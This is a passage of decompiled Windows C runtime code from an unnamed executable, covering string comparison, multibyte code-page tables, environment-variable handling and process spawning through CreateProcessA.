  uStack_18 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &uStack_18;
  puStack_20 = &stack0xffffffac;
  iVar3 = 1;
  puVar1 = &stack0xffffffac;
  if (DAT_00425470 == 0) {
    iVar2 = CompareStringW(0,0,L"",1,L"",1);
    if (iVar2 != 0) {
      DAT_00425470 = 1;
      puVar1 = puStack_20;
      goto LAB_0041c86e;
    }
    iVar2 = CompareStringA(0,0,"",1,"",1);
    if (iVar2 != 0) {
      DAT_00425470 = 2;
      puVar1 = puStack_20;
      goto LAB_0041c86e;
    }
  }
  else {
LAB_0041c86e:
    puStack_20 = puVar1;
    if (0 < param_3) {
      param_3 = FUN_0041ca78((char *)param_2,param_3);
    }
    if (0 < param_5) {
      param_5 = FUN_0041ca78((char *)param_4,param_5);
    }
    if (DAT_00425470 == 2) {
      iVar3 = CompareStringA(unaff_retaddr,param_1,(PCNZCH)param_2,param_3,(PCNZCH)param_4,param_5);
      goto LAB_0041ca66;
    }
    if (DAT_00425470 == 1) {
      if (param_6 == 0) {
        param_6 = DAT_00425260;
      }
      if ((param_3 == 0) || (param_5 == 0)) {
        if (param_3 == param_5) {
LAB_0041c8e6:
          iVar3 = 2;
          goto LAB_0041ca66;
        }
        if (1 < param_5) goto LAB_0041ca66;
        if (param_3 < 2) {
          BVar4 = GetCPInfo(param_6,&_Stack_44);
          if (BVar4 == 0) goto LAB_0041ca64;
          if (param_3 < 1) {
            if (0 < param_5) {
              if (1 < _Stack_44.MaxCharSize) {
                pBVar5 = _Stack_44.LeadByte;
                while ((_Stack_44.LeadByte[0] != 0 && (pBVar5[1] != 0))) {
                  if ((*pBVar5 <= *param_4) && (*param_4 <= pBVar5[1])) goto LAB_0041c8e6;
                  pBVar5 = pBVar5 + 2;
                  _Stack_44.LeadByte[0] = *pBVar5;
                }
              }
              goto LAB_0041ca66;
            }
            goto LAB_0041c979;
          }
          if (1 < _Stack_44.MaxCharSize) {
            pBVar5 = _Stack_44.LeadByte;
            while ((_Stack_44.LeadByte[0] != 0 && (pBVar5[1] != 0))) {
              if ((*pBVar5 <= *param_2) && (*param_2 <= pBVar5[1])) goto LAB_0041c8e6;
              pBVar5 = pBVar5 + 2;
              _Stack_44.LeadByte[0] = *pBVar5;
            }
          }
        }
        iVar3 = 3;
        goto LAB_0041ca66;
      }
LAB_0041c979:
      iStack_24 = MultiByteToWideChar(param_6,9,(LPCSTR)param_2,param_3,(LPWSTR)0x0,0);
      if (iStack_24 != 0) {
        uStack_c = 0;
        FUN_00415a50(unaff_DI);
        uStack_c = 0xffffffff;
        if ((&stack0x00000000 != (undefined *)0x54) &&
           (pWStack_2c = (PCNZWCH)&stack0xffffffac, puStack_20 = &stack0xffffffac,
           iVar3 = MultiByteToWideChar(param_6,1,(LPCSTR)param_2,param_3,(LPWSTR)&stack0xffffffac,
                                       iStack_24), iVar3 != 0)) {
          iVar3 = MultiByteToWideChar(param_6,9,(LPCSTR)param_4,param_5,(LPWSTR)0x0,0);
          if (iVar3 != 0) {
            uStack_c = 1;
            iStack_28 = iVar3;
            FUN_00415a50(unaff_DI);
            uStack_c = 0xffffffff;
            if ((&stack0x00000000 != (undefined *)0x54) &&
               (puStack_30 = &stack0xffffffac, puStack_20 = &stack0xffffffac,
               iVar2 = MultiByteToWideChar(param_6,1,(LPCSTR)param_4,param_5,
                                           (LPWSTR)&stack0xffffffac,iVar3), iVar2 != 0)) {
              iVar3 = CompareStringW(unaff_retaddr,param_1,pWStack_2c,iStack_24,
                                     (PCNZWCH)&stack0xffffffac,iVar3);
              goto LAB_0041ca66;
            }
          }
        }
      }
    }
  }
LAB_0041ca64:
  iVar3 = 0;
LAB_0041ca66:
  *unaff_FS_OFFSET = uStack_18;
  return iVar3;
}



int __cdecl
FUN_0041c7fb(LCID param_1,DWORD param_2,byte *param_3,int param_4,byte *param_5,int param_6,
            UINT param_7)

{
  undefined *puVar1;
  int iVar2;
  int iVar3;
  BOOL BVar4;
  BYTE *pBVar5;
  undefined unaff_DI;
  undefined4 *unaff_FS_OFFSET;
  _cpinfo local_40;
  undefined *local_2c;
  PCNZWCH local_28;
  int local_24;
  int local_20;
  undefined *local_1c;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_00401668;
  puStack_10 = &LAB_0041bc48;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  local_1c = &stack0xffffffb0;
  iVar3 = 1;
  puVar1 = &stack0xffffffb0;
  if (DAT_00425470 == 0) {
    iVar2 = CompareStringW(0,0,L"",1,L"",1);
    if (iVar2 != 0) {
      DAT_00425470 = 1;
      puVar1 = local_1c;
      goto LAB_0041c86e;
    }
    iVar2 = CompareStringA(0,0,"",1,"",1);
    if (iVar2 != 0) {
      DAT_00425470 = 2;
      puVar1 = local_1c;
      goto LAB_0041c86e;
    }
  }
  else {
LAB_0041c86e:
    local_1c = puVar1;
    if (0 < param_4) {
      param_4 = FUN_0041ca78((char *)param_3,param_4);
    }
    if (0 < param_6) {
      param_6 = FUN_0041ca78((char *)param_5,param_6);
    }
    if (DAT_00425470 == 2) {
      iVar3 = CompareStringA(param_1,param_2,(PCNZCH)param_3,param_4,(PCNZCH)param_5,param_6);
      goto LAB_0041ca66;
    }
    if (DAT_00425470 == 1) {
      if (param_7 == 0) {
        param_7 = DAT_00425260;
      }
      if ((param_4 == 0) || (param_6 == 0)) {
        if (param_4 == param_6) {
LAB_0041c8e6:
          iVar3 = 2;
          goto LAB_0041ca66;
        }
        if (1 < param_6) goto LAB_0041ca66;
        if (param_4 < 2) {
          BVar4 = GetCPInfo(param_7,&local_40);
          if (BVar4 == 0) goto LAB_0041ca64;
          if (param_4 < 1) {
            if (0 < param_6) {
              if (1 < local_40.MaxCharSize) {
                pBVar5 = local_40.LeadByte;
                while ((local_40.LeadByte[0] != 0 && (pBVar5[1] != 0))) {
                  if ((*pBVar5 <= *param_5) && (*param_5 <= pBVar5[1])) goto LAB_0041c8e6;
                  pBVar5 = pBVar5 + 2;
                  local_40.LeadByte[0] = *pBVar5;
                }
              }
              goto LAB_0041ca66;
            }
            goto LAB_0041c979;
          }
          if (1 < local_40.MaxCharSize) {
            pBVar5 = local_40.LeadByte;
            while ((local_40.LeadByte[0] != 0 && (pBVar5[1] != 0))) {
              if ((*pBVar5 <= *param_3) && (*param_3 <= pBVar5[1])) goto LAB_0041c8e6;
              pBVar5 = pBVar5 + 2;
              local_40.LeadByte[0] = *pBVar5;
            }
          }
        }
        iVar3 = 3;
        goto LAB_0041ca66;
      }
LAB_0041c979:
      local_20 = MultiByteToWideChar(param_7,9,(LPCSTR)param_3,param_4,(LPWSTR)0x0,0);
      if (local_20 != 0) {
        local_8 = 0;
        FUN_00415a50(unaff_DI);
        local_8 = 0xffffffff;
        if ((&stack0x00000000 != (undefined *)0x50) &&
           (local_28 = (PCNZWCH)&stack0xffffffb0, local_1c = &stack0xffffffb0,
           iVar3 = MultiByteToWideChar(param_7,1,(LPCSTR)param_3,param_4,(LPWSTR)&stack0xffffffb0,
                                       local_20), iVar3 != 0)) {
          iVar3 = MultiByteToWideChar(param_7,9,(LPCSTR)param_5,param_6,(LPWSTR)0x0,0);
          if (iVar3 != 0) {
            local_8 = 1;
            local_24 = iVar3;
            FUN_00415a50(unaff_DI);
            local_8 = 0xffffffff;
            if ((&stack0x00000000 != (undefined *)0x50) &&
               (local_2c = &stack0xffffffb0, local_1c = &stack0xffffffb0,
               iVar2 = MultiByteToWideChar(param_7,1,(LPCSTR)param_5,param_6,
                                           (LPWSTR)&stack0xffffffb0,iVar3), iVar2 != 0)) {
              iVar3 = CompareStringW(param_1,param_2,local_28,local_20,(PCNZWCH)&stack0xffffffb0,
                                     iVar3);
              goto LAB_0041ca66;
            }
          }
        }
      }
    }
  }
LAB_0041ca64:
  iVar3 = 0;
LAB_0041ca66:
  *unaff_FS_OFFSET = local_14;
  return iVar3;
}



int __cdecl FUN_0041ca78(char *param_1,int param_2)

{
  char *pcVar1;
  int iVar2;
  
  pcVar1 = param_1;
  iVar2 = param_2;
  if (param_2 != 0) {
    do {
      iVar2 = iVar2 + -1;
      if (*pcVar1 == '\0') break;
      pcVar1 = pcVar1 + 1;
    } while (iVar2 != 0);
  }
  if (*pcVar1 == '\0') {
    return (int)pcVar1 - (int)param_1;
  }
  return param_2;
}



undefined4 __cdecl FUN_0041caa3(int param_1)

{
  BYTE *pBVar1;
  byte bVar2;
  byte bVar3;
  UINT CodePage;
  UINT *pUVar4;
  BOOL BVar5;
  uint uVar6;
  BYTE *pBVar7;
  int iVar8;
  byte *pbVar9;
  int iVar10;
  byte *pbVar11;
  undefined4 *puVar12;
  _cpinfo local_1c;
  uint local_8;
  
  CodePage = FUN_0041cc3c(param_1);
  if (CodePage == DAT_004254a0) {
    return 0;
  }
  if (CodePage != 0) {
    iVar10 = 0;
    pUVar4 = &DAT_00408f58;
    do {
      if (*pUVar4 == CodePage) {
        puVar12 = (undefined4 *)&DAT_004255c0;
        for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {
          *puVar12 = 0;
          puVar12 = puVar12 + 1;
        }
        local_8 = 0;
        *(undefined *)puVar12 = 0;
        pbVar11 = &DAT_00408f68 + iVar10 * 0x30;
        do {
          bVar2 = *pbVar11;
          pbVar9 = pbVar11;
          while ((bVar2 != 0 && (bVar2 = pbVar9[1], bVar2 != 0))) {
            uVar6 = (uint)*pbVar9;
            if (uVar6 <= bVar2) {
              bVar3 = (&DAT_00408f50)[local_8];
              do {
                (&DAT_004255c1)[uVar6] = (&DAT_004255c1)[uVar6] | bVar3;
                uVar6 = uVar6 + 1;
              } while (uVar6 <= bVar2);
            }
            pbVar9 = pbVar9 + 2;
            bVar2 = *pbVar9;
          }
          local_8 = local_8 + 1;
          pbVar11 = pbVar11 + 8;
        } while (local_8 < 4);
        DAT_004254bc = 1;
        DAT_004254a0 = CodePage;
        DAT_004256c4 = FUN_0041cc86(CodePage);
        DAT_004254b0 = (&DAT_00408f5c)[iVar10 * 0xc];
        DAT_004254b4 = (&DAT_00408f60)[iVar10 * 0xc];
        DAT_004254b8 = (&DAT_00408f64)[iVar10 * 0xc];
        goto LAB_0041cc2b;
      }
      pUVar4 = pUVar4 + 0xc;
      iVar10 = iVar10 + 1;
    } while ((int)pUVar4 < 0x409048);
    BVar5 = GetCPInfo(CodePage,&local_1c);
    if (BVar5 == 1) {
      puVar12 = (undefined4 *)&DAT_004255c0;
      DAT_004254a0 = CodePage;
      for (iVar10 = 0x40; iVar10 != 0; iVar10 = iVar10 + -1) {
        *puVar12 = 0;
        puVar12 = puVar12 + 1;
      }
      *(undefined *)puVar12 = 0;
      DAT_004256c4 = 0;
      if (local_1c.MaxCharSize < 2) {
        DAT_004254bc = 0;
      }
      else {
        if (local_1c.LeadByte[0] != '\0') {
          pBVar7 = local_1c.LeadByte + 1;
          do {
            bVar2 = *pBVar7;
            if (bVar2 == 0) break;
            for (uVar6 = (uint)pBVar7[-1]; uVar6 <= bVar2; uVar6 = uVar6 + 1) {
              (&DAT_004255c1)[uVar6] = (&DAT_004255c1)[uVar6] | 4;
            }
            pBVar1 = pBVar7 + 1;
            pBVar7 = pBVar7 + 2;
          } while (*pBVar1 != 0);
        }
        uVar6 = 1;
        do {
          (&DAT_004255c1)[uVar6] = (&DAT_004255c1)[uVar6] | 8;
          uVar6 = uVar6 + 1;
        } while (uVar6 < 0xff);
        DAT_004256c4 = FUN_0041cc86(CodePage);
        DAT_004254bc = 1;
      }
      DAT_004254b0 = 0;
      DAT_004254b4 = 0;
      DAT_004254b8 = 0;
      goto LAB_0041cc2b;
    }
    if (DAT_00425474 == 0) {
      return 0xffffffff;
    }
  }
  FUN_0041ccb9();
LAB_0041cc2b:
  FUN_0041cce2();
  return 0;
}



int __cdecl FUN_0041cc3c(int param_1)

{
  int iVar1;
  bool bVar2;
  
  if (param_1 == -2) {
    DAT_00425474 = 1;
                    // WARNING: Could not recover jumptable at 0x0041cc56. Too many branches
                    // WARNING: Treating indirect jump as call
    iVar1 = GetOEMCP();
    return iVar1;
  }
  if (param_1 == -3) {
    DAT_00425474 = 1;
                    // WARNING: Could not recover jumptable at 0x0041cc6b. Too many branches
                    // WARNING: Treating indirect jump as call
    iVar1 = GetACP();
    return iVar1;
  }
  bVar2 = param_1 == -4;
  if (bVar2) {
    param_1 = DAT_00425260;
  }
  DAT_00425474 = (uint)bVar2;
  return param_1;
}



undefined4 __cdecl FUN_0041cc86(int param_1)

{
  if (param_1 == 0x3a4) {
    return 0x411;
  }
  if (param_1 == 0x3a8) {
    return 0x804;
  }
  if (param_1 == 0x3b5) {
    return 0x412;
  }
  if (param_1 != 0x3b6) {
    return 0;
  }
  return 0x404;
}



void FUN_0041ccb9(void)

{
  int iVar1;
  undefined4 *puVar2;
  
  puVar2 = (undefined4 *)&DAT_004255c0;
  for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined *)puVar2 = 0;
  DAT_004254a0 = 0;
  DAT_004254bc = 0;
  DAT_004256c4 = 0;
  DAT_004254b0 = 0;
  DAT_004254b4 = 0;
  DAT_004254b8 = 0;
  return;
}



void FUN_0041cce2(void)

{
  BOOL BVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  uint uVar5;
  ushort *puVar6;
  undefined uVar7;
  BYTE *pBVar8;
  undefined4 *puVar9;
  WORD local_518 [256];
  WCHAR local_318 [128];
  WCHAR local_218 [128];
  undefined4 local_118 [64];
  _cpinfo local_18;
  
  BVar1 = GetCPInfo(DAT_004254a0,&local_18);
  if (BVar1 == 1) {
    uVar2 = 0;
    do {
      *(char *)((int)local_118 + uVar2) = (char)uVar2;
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x100);
    local_118[0]._0_1_ = 0x20;
    if (local_18.LeadByte[0] != 0) {
      pBVar8 = local_18.LeadByte + 1;
      do {
        uVar2 = (uint)local_18.LeadByte[0];
        if (uVar2 <= *pBVar8) {
          uVar4 = (*pBVar8 - uVar2) + 1;
          puVar9 = (undefined4 *)((int)local_118 + uVar2);
          for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
            *puVar9 = 0x20202020;
            puVar9 = puVar9 + 1;
          }
          for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
            *(undefined *)puVar9 = 0x20;
            puVar9 = (undefined4 *)((int)puVar9 + 1);
          }
        }
        local_18.LeadByte[0] = pBVar8[1];
        pBVar8 = pBVar8 + 2;
      } while (local_18.LeadByte[0] != 0);
    }
    FUN_0041d84e(1,(LPCSTR)local_118,0x100,local_518,DAT_004254a0,DAT_004256c4,0);
    FUN_0041a5d5(DAT_004256c4,0x100,(char *)local_118,0x100,local_218,0x100,DAT_004254a0,0);
    FUN_0041a5d5(DAT_004256c4,0x200,(char *)local_118,0x100,local_318,0x100,DAT_004254a0,0);
    uVar2 = 0;
    puVar6 = local_518;
    do {
      if ((*puVar6 & 1) == 0) {
        if ((*puVar6 & 2) != 0) {
          (&DAT_004255c1)[uVar2] = (&DAT_004255c1)[uVar2] | 0x20;
          uVar7 = *(undefined *)((int)local_318 + uVar2);
          goto LAB_0041cdee;
        }
        (&DAT_004254c0)[uVar2] = 0;
      }
      else {
        (&DAT_004255c1)[uVar2] = (&DAT_004255c1)[uVar2] | 0x10;
        uVar7 = *(undefined *)((int)local_218 + uVar2);
LAB_0041cdee:
        (&DAT_004254c0)[uVar2] = uVar7;
      }
      uVar2 = uVar2 + 1;
      puVar6 = puVar6 + 1;
    } while (uVar2 < 0x100);
  }
  else {
    uVar2 = 0;
    do {
      if ((uVar2 < 0x41) || (0x5a < uVar2)) {
        if ((0x60 < uVar2) && (uVar2 < 0x7b)) {
          (&DAT_004255c1)[uVar2] = (&DAT_004255c1)[uVar2] | 0x20;
          cVar3 = (char)uVar2 + -0x20;
          goto LAB_0041ce38;
        }
        (&DAT_004254c0)[uVar2] = 0;
      }
      else {
        (&DAT_004255c1)[uVar2] = (&DAT_004255c1)[uVar2] | 0x10;
        cVar3 = (char)uVar2 + ' ';
LAB_0041ce38:
        (&DAT_004254c0)[uVar2] = cVar3;
      }
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x100);
  }
  return;
}



void FUN_0041ce67(void)

{
  if (DAT_00426828 == 0) {
    FUN_0041caa3(-3);
    DAT_00426828 = 1;
  }
  return;
}



undefined4 __cdecl FUN_0041ce83(uint *param_1,int param_2)

{
  uint *puVar1;
  int iVar2;
  uint **ppuVar3;
  char *pcVar4;
  uint *lpName;
  undefined *puVar5;
  uint **ppuVar6;
  bool bVar7;
  
  if (param_1 == (uint *)0x0) {
    return 0xffffffff;
  }
  puVar1 = FUN_0041d0c9(param_1,0x3d);
  if (puVar1 == (uint *)0x0) {
    return 0xffffffff;
  }
  if (param_1 == puVar1) {
    return 0xffffffff;
  }
  bVar7 = *(char *)((int)puVar1 + 1) == '\0';
  if (DAT_004251bc == DAT_004251c0) {
    DAT_004251bc = FUN_0041d062(DAT_004251bc);
  }
  if (DAT_004251bc == (uint **)0x0) {
    if ((param_2 == 0) || (DAT_004251c4 == (undefined4 *)0x0)) {
      if (bVar7) {
        return 0;
      }
      DAT_004251bc = (uint **)FUN_00415216((uint *)0x4);
      if (DAT_004251bc == (uint **)0x0) {
        return 0xffffffff;
      }
      *DAT_004251bc = (uint *)0x0;
      if (DAT_004251c4 == (undefined4 *)0x0) {
        DAT_004251c4 = (undefined4 *)FUN_00415216((uint *)0x4);
        if (DAT_004251c4 == (undefined4 *)0x0) {
          return 0xffffffff;
        }
        *DAT_004251c4 = 0;
      }
    }
    else {
      iVar2 = FUN_0041a074();
      if (iVar2 != 0) {
        return 0xffffffff;
      }
    }
  }
  ppuVar3 = DAT_004251bc;
  iVar2 = FUN_0041d00a((byte *)param_1,(int)puVar1 - (int)param_1);
  if ((iVar2 < 0) || (*ppuVar3 == (uint *)0x0)) {
    if (bVar7) {
      return 0;
    }
    if (iVar2 < 0) {
      iVar2 = -iVar2;
    }
    ppuVar3 = (uint **)FUN_0041dbdd((int *)ppuVar3,(uint *)(iVar2 * 4 + 8));
    if (ppuVar3 == (uint **)0x0) {
      return 0xffffffff;
    }
    ppuVar3[iVar2] = param_1;
    ppuVar3[iVar2 + 1] = (uint *)0x0;
  }
  else {
    if (!bVar7) {
      ppuVar3[iVar2] = param_1;
      goto LAB_0041cfb7;
    }
    ppuVar6 = ppuVar3 + iVar2;
    FUN_004150a9(ppuVar3[iVar2]);
    for (; *ppuVar6 != (uint *)0x0; ppuVar6 = ppuVar6 + 1) {
      iVar2 = iVar2 + 1;
      *ppuVar6 = ppuVar6[1];
    }
    ppuVar3 = (uint **)FUN_0041dbdd((int *)ppuVar3,(uint *)(iVar2 << 2));
    if (ppuVar3 == (uint **)0x0) goto LAB_0041cfb7;
  }
  DAT_004251bc = ppuVar3;
LAB_0041cfb7:
  if (param_2 != 0) {
    pcVar4 = FUN_004194b0(param_1);
    lpName = (uint *)FUN_00415216((uint *)(pcVar4 + 2));
    if (lpName != (uint *)0x0) {
      FUN_0041a1d0(lpName,param_1);
      puVar5 = (undefined *)(((int)lpName - (int)param_1) + (int)puVar1);
      *puVar5 = 0;
      SetEnvironmentVariableA((LPCSTR)lpName,(LPCSTR)(~-(uint)bVar7 & (uint)(puVar5 + 1)));
      FUN_004150a9(lpName);
    }
  }
  return 0;
}



int __cdecl FUN_0041d00a(byte *param_1,int param_2)

{
  byte *pbVar1;
  int iVar2;
  byte **ppbVar3;
  
  pbVar1 = *DAT_004251bc;
  ppbVar3 = DAT_004251bc;
  while( true ) {
    if (pbVar1 == (byte *)0x0) {
      return -((int)ppbVar3 - (int)DAT_004251bc >> 2);
    }
    iVar2 = FUN_0041a035(param_1,pbVar1,param_2);
    if ((iVar2 == 0) && (((*ppbVar3)[param_2] == 0x3d || ((*ppbVar3)[param_2] == 0)))) break;
    pbVar1 = ppbVar3[1];
    ppbVar3 = ppbVar3 + 1;
  }
  return (int)ppbVar3 - (int)DAT_004251bc >> 2;
}



uint ** __cdecl FUN_0041d062(uint **param_1)

{
  uint **ppuVar1;
  uint *puVar2;
  int iVar3;
  uint **ppuVar4;
  
  iVar3 = 0;
  if (param_1 != (uint **)0x0) {
    puVar2 = *param_1;
    ppuVar1 = param_1;
    while (puVar2 != (uint *)0x0) {
      ppuVar1 = ppuVar1 + 1;
      iVar3 = iVar3 + 1;
      puVar2 = *ppuVar1;
    }
    ppuVar1 = (uint **)FUN_00415216((uint *)(iVar3 * 4 + 4));
    if (ppuVar1 == (uint **)0x0) {
      FUN_004168e0(9);
    }
    puVar2 = *param_1;
    ppuVar4 = ppuVar1;
    while (puVar2 != (uint *)0x0) {
      param_1 = param_1 + 1;
      puVar2 = FUN_0041a907(puVar2);
      *ppuVar4 = puVar2;
      ppuVar4 = ppuVar4 + 1;
      puVar2 = *param_1;
    }
    *ppuVar4 = (uint *)0x0;
    return ppuVar1;
  }
  return (uint **)0x0;
}



uint * __cdecl FUN_0041d0c9(uint *param_1,uint param_2)

{
  ushort uVar1;
  uint *puVar2;
  
  if (DAT_004254bc == 0) {
    puVar2 = FUN_00415540(param_1,(char)param_2);
    return puVar2;
  }
  while( true ) {
    uVar1 = (ushort)*(byte *)param_1;
    if (uVar1 == 0) break;
    if (((&DAT_004255c1)[uVar1] & 4) == 0) {
      puVar2 = param_1;
      if (param_2 == uVar1) break;
    }
    else {
      puVar2 = (uint *)((int)param_1 + 1);
      if (*(byte *)((int)param_1 + 1) == 0) {
        return (uint *)0x0;
      }
      if (param_2 == CONCAT11(*(byte *)param_1,*(byte *)((int)param_1 + 1))) {
        return param_1;
      }
    }
    param_1 = (uint *)((int)puVar2 + 1);
  }
  return (uint *)(~-(uint)(param_2 != uVar1) & (uint)param_1);
}



char * __cdecl FUN_0041d13c(int param_1,LPCSTR param_2,char *param_3,LPVOID param_4)

{
  undefined4 *puVar1;
  byte bVar2;
  char *pcVar3;
  uint uVar5;
  undefined4 *puVar6;
  BOOL BVar7;
  DWORD DVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  _STARTUPINFOA local_64;
  _PROCESS_INFORMATION local_20;
  char *local_10;
  DWORD local_c;
  char local_5;
  char *pcVar4;
  
  local_5 = '\0';
  local_c = 0;
  if ((param_1 != 0) && (param_1 != 1)) {
    if (param_1 < 2) {
      DAT_00425194 = 0x16;
      DAT_00425198 = 0;
      return (char *)0xffffffff;
    }
    if (3 < param_1) {
      if (param_1 != 4) {
        DAT_00425194 = 0x16;
        DAT_00425198 = 0;
        return (char *)0xffffffff;
      }
      local_5 = '\x01';
    }
  }
  local_10 = param_3;
  pcVar3 = param_3;
  while (*pcVar3 != '\0') {
    do {
      pcVar4 = pcVar3;
      pcVar3 = pcVar4 + 1;
    } while (*pcVar3 != '\0');
    if (pcVar4[2] != '\0') {
      *pcVar3 = ' ';
      pcVar3 = pcVar4 + 2;
    }
  }
  FUN_00419530(&local_64.cb,0,0x44);
  local_64.cb = 0x44;
  uVar11 = DAT_00426800;
  uVar5 = DAT_00426800;
  while ((uVar11 != 0 &&
         (uVar5 = uVar5 - 1,
         *(char *)((&DAT_00426700)[(int)uVar5 >> 5] + 4 + (uVar5 & 0x1f) * 8) == '\0'))) {
    uVar11 = uVar11 - 1;
  }
  uVar5 = uVar11 * 5 + 4;
  local_64.cbReserved2 = (WORD)uVar5;
  local_64.lpReserved2 = (LPBYTE)FUN_004155fc(uVar5 & 0xffff,1);
  *(uint *)local_64.lpReserved2 = uVar11;
  uVar5 = 0;
  puVar9 = (uint *)((int)local_64.lpReserved2 + 4);
  puVar6 = (undefined4 *)((int)local_64.lpReserved2 + uVar11 + 4);
  if (0 < (int)uVar11) {
    do {
      puVar1 = (undefined4 *)((&DAT_00426700)[(int)uVar5 >> 5] + (uVar5 & 0x1f) * 8);
      bVar2 = *(byte *)(puVar1 + 1);
      if ((bVar2 & 0x10) == 0) {
        *(byte *)puVar9 = bVar2;
        *puVar6 = *puVar1;
      }
      else {
        *(byte *)puVar9 = 0;
        *puVar6 = 0xffffffff;
      }
      uVar5 = uVar5 + 1;
      puVar9 = (uint *)((int)puVar9 + 1);
      puVar6 = puVar6 + 1;
    } while ((int)uVar5 < (int)uVar11);
  }
  if (local_5 != '\0') {
    puVar9 = (uint *)((int)local_64.lpReserved2 + 4);
    iVar10 = 0;
    puVar6 = (undefined4 *)((int)local_64.lpReserved2 + uVar11 + 4);
    while( true ) {
      uVar5 = uVar11;
      if (2 < (int)uVar11) {
        uVar5 = 3;
      }
      if ((int)uVar5 <= iVar10) break;
      *(undefined *)puVar9 = 0;
      *puVar6 = 0xffffffff;
      iVar10 = iVar10 + 1;
      puVar9 = (uint *)((int)puVar9 + 1);
      puVar6 = puVar6 + 1;
    }
    local_c = 8;
  }
  DAT_00425194 = 0;
  DAT_00425198 = 0;
  BVar7 = CreateProcessA(param_2,local_10,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,1,
                         local_c,param_4,(LPCSTR)0x0,&local_64,&local_20);
  DVar8 = GetLastError();
  FUN_004150a9(local_64.lpReserved2);
  if (BVar7 != 0) {
    if (param_1 == 2) {
      FUN_00415edd(0);
    }
    if (param_1 == 0) {
      WaitForSingleObject(local_20.hProcess,0xffffffff);
      GetExitCodeProcess(local_20.hProcess,(LPDWORD)&param_3);
      CloseHandle(local_20.hProcess);
    }
    else if (param_1 == 4) {
      CloseHandle(local_20.hProcess);
      param_3 = (char *)0x0;
    }
    else {
      param_3 = (char *)local_20.hProcess;
    }
    CloseHandle(local_20.hThread);
    return param_3;
  }
  FUN_0041a0e2(DVar8);
  return (char *)0xffffffff;
}



undefined4 __cdecl FUN_0041d31b(uint **param_1,uint **param_2,uint **param_3,uint **param_4)

{
  char *pcVar1;
  uint *puVar2;
  undefined4 uVar3;
  char cVar4;
  uint **ppuVar5;
  uint *puVar6;
  uint **ppuVar7;
  
  puVar6 = (uint *)0x2;
  puVar2 = puVar6;
  for (ppuVar5 = param_1; *ppuVar5 != (uint *)0x0; ppuVar5 = ppuVar5 + 1) {
    pcVar1 = FUN_004194b0(*ppuVar5);
    puVar2 = (uint *)(pcVar1 + (int)puVar2 + 1);
  }
  puVar2 = (uint *)FUN_00415216(puVar2);
  *param_3 = puVar2;
  if (puVar2 == (uint *)0x0) {
    *param_4 = (uint *)0x0;
LAB_0041d43c:
    DAT_00425194 = 0xc;
    DAT_00425198 = 8;
LAB_0041d450:
    uVar3 = 0xffffffff;
  }
  else {
    ppuVar5 = param_2;
    if (param_2 == (uint **)0x0) {
      *param_4 = (uint *)0x0;
      ppuVar5 = param_4;
      ppuVar7 = param_4;
    }
    else {
      for (; *ppuVar5 != (uint *)0x0; ppuVar5 = ppuVar5 + 1) {
        pcVar1 = FUN_004194b0(*ppuVar5);
        puVar6 = (uint *)(pcVar1 + (int)((int)puVar6 + 1));
      }
      if (DAT_0042521c == (uint *)0x0) {
        DAT_0042521c = FUN_0041bb0c();
        if (DAT_0042521c != (uint *)0x0) goto LAB_0041d3b9;
        goto LAB_0041d450;
      }
LAB_0041d3b9:
      ppuVar5 = (uint **)0x0;
      if (*(char *)DAT_0042521c != '\0') {
        cVar4 = *(char *)DAT_0042521c;
        puVar2 = DAT_0042521c;
        do {
          if (cVar4 == '=') break;
          pcVar1 = FUN_004194b0(puVar2);
          ppuVar5 = (uint **)(pcVar1 + (int)((int)ppuVar5 + 1));
          cVar4 = *(char *)((int)DAT_0042521c + (int)ppuVar5);
          puVar2 = (uint *)((int)DAT_0042521c + (int)ppuVar5);
        } while (cVar4 != '\0');
      }
      pcVar1 = (char *)((int)DAT_0042521c + (int)ppuVar5);
      ppuVar7 = ppuVar5;
      while ((((*pcVar1 == '=' && (pcVar1[1] != '\0')) && (pcVar1[2] == ':')) && (pcVar1[3] == '='))
            ) {
        pcVar1 = FUN_004194b0((uint *)(pcVar1 + 4));
        ppuVar7 = (uint **)(pcVar1 + (int)((int)ppuVar7 + 5));
        pcVar1 = (char *)((int)DAT_0042521c + (int)ppuVar7);
      }
      puVar2 = (uint *)FUN_00415216((uint *)(((int)ppuVar7 - (int)ppuVar5) + (int)puVar6));
      *param_4 = puVar2;
      if (puVar2 == (uint *)0x0) {
        FUN_004150a9(*param_3);
        *param_3 = (uint *)0x0;
        goto LAB_0041d43c;
      }
    }
    puVar2 = *param_3;
    param_3 = param_1;
    if (*param_1 != (uint *)0x0) {
      FUN_0041a1d0(puVar2,*param_1);
      param_3 = param_1 + 1;
      pcVar1 = FUN_004194b0(*param_1);
      puVar2 = (uint *)(pcVar1 + (int)puVar2 + 1);
      goto LAB_0041d477;
    }
    while( true ) {
      puVar2 = (uint *)((int)puVar2 + 1);
LAB_0041d477:
      if (*param_3 == (uint *)0x0) break;
      FUN_0041a1d0(puVar2,*param_3);
      pcVar1 = FUN_004194b0(*param_3);
      puVar2 = (uint *)((int)puVar2 + (int)pcVar1);
      *(undefined *)puVar2 = 0x20;
      param_3 = param_3 + 1;
    }
    *(undefined *)((int)puVar2 + -1) = 0;
    *(undefined *)puVar2 = 0;
    puVar2 = *param_4;
    if (param_2 != (uint **)0x0) {
      FUN_00417960(puVar2,(undefined4 *)((int)DAT_0042521c + (int)ppuVar5),
                   (int)ppuVar7 - (int)ppuVar5);
      puVar2 = (uint *)((int)puVar2 + ((int)ppuVar7 - (int)ppuVar5));
      for (; *param_2 != (uint *)0x0; param_2 = param_2 + 1) {
        FUN_0041a1d0(puVar2,*param_2);
        pcVar1 = FUN_004194b0(*param_2);
